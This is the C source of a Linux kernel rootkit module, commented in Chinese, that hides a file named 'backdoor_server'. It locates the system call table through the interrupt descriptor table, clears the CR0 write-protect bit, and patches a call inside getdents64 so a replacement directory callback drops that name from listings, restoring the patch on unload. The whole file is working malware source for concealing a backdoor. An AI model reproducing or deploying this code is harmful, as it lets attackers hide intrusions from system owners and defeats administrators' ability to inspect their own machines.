
#include <linux/module.h>
#include <linux/kernel.h>
#include <asm/unistd.h>
#include <linux/types.h>
#include <linux/sched.h>
#include <linux/dirent.h>//目录文件结构
#include <linux/string.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/list.h>
#include <asm/uaccess.h>
#include <linux/unistd.h>
#include <linux/slab.h> //kmalloc
#include <linux/security.h>//security_file_permission(file, MAY_READ);

#define CALLOFF 1000


/*
    http://www.freebuf.com/articles/system/108392.html
    http://www.xzbu.com/8/view-7178072.htm
*/
int orig_cr0;
char fname[20]="backdoor_server";//需要隐藏的文件名
char *filename=fname;
const char path[10]="Desktop";
static unsigned int orig_offset = 0;// orig iterate_dir offset
//module_param(processname, charp, 0);


/*
    IDT表可以驻留在线性地址空间的任何地方，处理器使用IDTR寄存器来定位IDT表的位置。
    这个寄存器中含有IDT表32位的基地址和16位的长度（限长）值。
    IDT表基地址应该对齐在8字节边界上以提高处理器的访问效率。
    限长值是以字节为单位的IDT表的长度。
*/
struct {
    unsigned short limit;
    unsigned int base;
} __attribute__ ((packed)) idtr;//__attribute__ ((packed))不需要内存对齐的优化

struct {
    unsigned short off1;
    unsigned short sel;
    unsigned char none,flags;
    unsigned short off2;
} __attribute__ ((packed)) * idt;

struct linux_dirent{//文件结构体
    unsigned long     d_ino;//索引节点号
    unsigned long     d_off;//在目录文件中的偏移
    unsigned short    d_reclen;//文件名长
    char    d_name[1];//文件名
};

struct getdents_callback64 {
	struct dir_context ctx;
	struct linux_dirent64 __user * current_dir;
	struct linux_dirent64 __user * previous;
	int count;
	int error;
};

void** sys_call_table;

unsigned int clear_and_return_cr0(void)//设置CR0，取消写保护位，因为在较新的内核中，sys_call_table的内存是只读的，
//所以要修改系统调用表就必须设置CR0
{
    unsigned int cr0 = 0;
    unsigned int ret;

    asm volatile ("movl %%cr0, %%eax"
            : "=a"(cr0)//eax到cr0
         );
    ret = cr0;//

    /*clear the 16th bit of CR0,*/
    cr0 &= 0xfffeffff;//设置CR0，第16位，WP（Write Protect）,它控制是否允许处理器向标志为只读属性的内存页写入数据,
    //0时表示禁用写保护功能
    asm volatile ("movl %%eax, %%cr0"
            :
            : "a"(cr0)//输入，cr0到eax，eax到cr0
         );
    return ret;
}

void setback_cr0(unsigned int val)
{
    asm volatile ("movl %%eax, %%cr0"
            :
            : "a"(val)//val值给eax，eax的值给CR0,恢复写保护位
         );
}


//asmlinkage long (*orig_getdents)(unsigned int fd,
 //                   struct linux_dirent __user *dirp, unsigned int count);
asmlinkage long (*orig_getdents64)(unsigned int fd, 
			struct linux_dirent64 __user * dirent, unsigned int count);


/*
    通过对反汇编分析可知，所有SCT中的系统调用都是通过call指令进行调用的。
    因此，可以通过搜索call指令来寻找SCT的入口。
    在x86架构下，call指令的16进制码为/xff/x14/x85，所以首先通过字符匹配搜说call指令。
    从system_call的起始地址开始搜索，一旦搜索到连续的三个字节分别为ff,14,85,可得到call指令的地址。
*/
char * findoffset(char *start)//遍历sys_call代码，查找sys_call_table的地址
{  //也可以通过cat /boot/System.map-`uname -r` |grep sys_call_table  查看当前sys_call_table地址
    char *p;
    for (p = start; p < start + CALLOFF; p++)
    if (*(p + 0) == '\xff' && *(p + 1) == '\x14' && *(p + 2) == '\x85')//寻找call指令
        return p;
    return NULL;
}




void **get_sct_addr(void)
{
    unsigned sys_call_off;
    unsigned sct = 0;
    char *p;
/*
        使用内联汇编的办法调用sidt这一汇编指令加载IDTR寄存器的内容，然后储存到我们自己的这个结构体中
    */
    asm("sidt %0":"=m"(idtr));//获取中断描述符表地址
/*
        这条语句的目的是获取0×80中断所对应的IDT中的表项。
        中断描述符表共256项，每项8字节，每项代表一种中断类型，所以最多需要256*8=2048个字节来存放IDT。
        我们要从IDT起始地址后的8*0×80位置拷贝一个IDT表项大小的数据，也就是0×80中断所对应的IDT中的表项
    */
    idt = (void *) (idtr.base + 8 * 0x80);//通过0x80中断找到system_call的服务例程描述符项，一个中断描述符8个字节
/*
        获取128号中断的中断服务程序system_call的地址。
        此时highoffset即为ox80程序地址的高16位，lowoffset为低16位。
        将highoffset左移16位加上lowoffset即可得到0x80中断处理程序的system_call的起始地址
    */
    sys_call_off = (idt->off2 << 16) | idt->off1;//找到对应的system_call代码地址
/*
        获取SCT地址
    */
    if ((p = findoffset((char *) sys_call_off)))//找到sys_call_table的地址
        sct = *(unsigned *) (p + 3);//由于SCT地址紧跟在call指令后面，所以p+3即为SCT的地址
    return ((void **)sct);
}

//callback function
static int my_filldir64(void * __buf, const char * name, int namlen, loff_t offset,
		     u64 ino, unsigned int d_type)
{
	
	struct linux_dirent64 __user *dirent;
	struct getdents_callback64 * buf = (struct getdents_callback64 *) __buf;
	int reclen = 0;
	/*
		hide target file
	*/
	if(strcmp(name,filename)==0){
		printk("hide successed!\n");
		return 0;		
	}
	reclen = ALIGN(offsetof(struct linux_dirent64, d_name) + namlen + 1,
		sizeof(u64));

	buf->error = -EINVAL;	/* only used if we fail.. */
	if (reclen > buf->count)
		return -EINVAL;
	dirent = buf->previous;
	if (dirent) {
		if (__put_user(offset, &dirent->d_off))
			goto efault;
	}
	dirent = buf->current_dir;
	if (__put_user(ino, &dirent->d_ino))
		goto efault;
	if (__put_user(0, &dirent->d_off))
		goto efault;
	if (__put_user(reclen, &dirent->d_reclen))
		goto efault;
	if (__put_user(d_type, &dirent->d_type))
		goto efault;
	if (copy_to_user(dirent->d_name, name, namlen))
		goto efault;
	if (__put_user(0, dirent->d_name + namlen))
		goto efault;
	buf->previous = dirent;
	dirent = (void __user *)dirent + reclen;
	buf->current_dir = dirent;
	buf->count -= reclen;
	return 0;
efault:
	buf->error = -EFAULT;
	return -EFAULT;
}


int my_iterate_dir(struct file *file, struct dir_context *ctx)
{
	
	//printk("111\n");
	struct inode *inode = NULL;
	int res = 0;
	/*
		change callback func
	*/
	*(filldir_t *)&ctx->actor = my_filldir64;
	inode = file_inode(file);
	res = -ENOTDIR;
	if (!file->f_op->iterate)
		goto out;

	res = security_file_permission(file, MAY_READ);
	if (res)
		goto out;

	res = mutex_lock_killable(&inode->i_mutex);
	if (res)
		goto out;

	res = -ENOENT;
	if (!IS_DEADDIR(inode)) {
		ctx->pos = file->f_pos;
		res = file->f_op->iterate(file, ctx);
		file->f_pos = ctx->pos;
		file_accessed(file);
	}
	mutex_unlock(&inode->i_mutex);
out:
	return res;
}
EXPORT_SYMBOL(my_iterate_dir);//useful to all kernal


/*
asmlinkage long hacked_getdents64(unsigned int fd, struct linux_dirent64 __user * dirent, unsigned int count){
	
	struct fd f;
	struct linux_dirent64 __user * lastdirent;
	struct getdents_callback64 buf = {
		.ctx.actor = my_filldir64,   //<-----------callback func
		.count = count,
		.current_dir = dirent
	};
	int error;

	if (!access_ok(VERIFY_WRITE, dirent, count))//调用access_ok来验证是下用户空间的dirent地址是否越界，是否可写。//<----------first call
		return -EFAULT;

	f = fdget(fd);				//<----------second call
	if (!f.file)
		return -EBADF;

	error = my_iterate_dir(f.file, &buf.ctx);	//<----------third call
	if (error >= 0)
		error = buf.error;
	lastdirent = buf.previous;
	if (lastdirent) {
		typeof(lastdirent->d_off) d_off = buf.ctx.pos;
		if (__put_user(d_off, &lastdirent->d_off))
			error = -EFAULT;
		else
			error = count - buf.count;
	}
	fdput(f);
	return error;
}
*/



/*
	Setback orig offset
*/
unsigned int setback_offset(unsigned int handler, unsigned int offset){
	unsigned char *p = (unsigned char *)handler;
	unsigned char *p_orig = NULL;
	int call_count = 0;

	unsigned char *p_cp = (unsigned char *)kmalloc(CALLOFF,GFP_KERNEL);	
	memcpy(p_cp,p,CALLOFF);

	p_orig = p_cp;
	while (1) {
        	if (*p_cp == 0xe8) //call instuctor(e8):relative addr; ff: absolute addr
			call_count++;
		if(call_count==3){
			p_cp[1] = (offset & 0x000000ff);
    			p_cp[2] = (offset & 0x0000ff00) >> 8;  
    			p_cp[3] = (offset & 0x00ff0000) >> 16;
   			p_cp[4] = (offset & 0xff000000) >> 24;
			memcpy(p,p_orig,CALLOFF);
			kfree(p_cp);
			return 1;
		}
		p_cp++;
    	}
	
	return 0;
}


/*
	get orig func offset and update
*/
unsigned int find_orin_iterate_dir_offset(unsigned int handler, unsigned int new_func)
{	
	
    	unsigned char *p = (unsigned char *)handler;
    	unsigned char *p_orig = NULL;
    	unsigned int offset = 0;
	int call_count = 0;
 	int i = 0;
	unsigned char *p_cp = (unsigned char *)kmalloc(CALLOFF,GFP_KERNEL);
	memcpy(p_cp,p,CALLOFF);
	p_orig = p_cp;

	printk("getdents64 addr: 0x%08x, new_func addr: 0x%08x\n",handler, new_func);

    	while (1) {
        	if (*p_cp == 0xe8) //call instuctor(e8):relative addr; ff: absolute path 
			call_count++;
		if(call_count==3){
			orig_offset = *((unsigned int*)(p_cp+1)); //recored orig offset
			break;
			
		}
		p_cp++;
		i++;
    	}

	printk("call code: 0x%02x\n", *p_cp);
	printk("call addr: 0x%08x, orig_offset: 0x%08x\n", (unsigned int)(p+i), orig_offset);

	//目标地址=下条指令的地址+机器码E8后面所跟的32位数offset
    	offset = new_func - (handler+i) - 5;
	//write the offset of my_iterate_dir
    	p_cp[1] = (offset & 0x000000ff);
    	p_cp[2] = (offset & 0x0000ff00) >> 8;  
    	p_cp[3] = (offset & 0x00ff0000) >> 16;
   	p_cp[4] = (offset & 0xff000000) >> 24;

    	printk("call addr: 0x%08x, new func offset: 0x%08x, new func addr check: %08x\n",(unsigned int)(p+i), offset, *((unsigned int*)(p_cp+1))+(handler+i) + 5);
	memcpy(p,p_orig,CALLOFF);
	kfree(p_cp);
	return orig_offset;
}



static int filter_init(void)
{

    	sys_call_table = get_sct_addr();
    	if (!sys_call_table)
   	{
        	printk("get_sct_addr: NULL...\n");
        	return 0;
        }
    	else
        	printk("sct: 0x%x\n", (unsigned int)sys_call_table);
    	orig_cr0 = clear_and_return_cr0();//取消写保护位，并且返回原来的cr0
	
	//get orig func offset and update
	find_orin_iterate_dir_offset((unsigned int)sys_call_table[__NR_getdents64] ,(unsigned int)my_iterate_dir);

	//print and check sct
	printk("sys_getdents addr: %08x\n",(unsigned int)sys_call_table[220]);

    	setback_cr0(orig_cr0);
	printk(KERN_INFO "******module loaded******\n");
        return 0;
}





static void filter_exit(void)
{
	//unsigned int temp = 0;
   	orig_cr0 = clear_and_return_cr0();
		
	//Setback orig offset
	if( setback_offset((unsigned int)sys_call_table[__NR_getdents64], orig_offset) != 0)	
		printk("Setback orig offset successed!\n");
	else 
		printk("Setback orig offset failed!\n");


    	setback_cr0(orig_cr0);

    	printk(KERN_INFO "******module removed******\n");
}
module_init(filter_init);
module_exit(filter_exit);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Asensio");
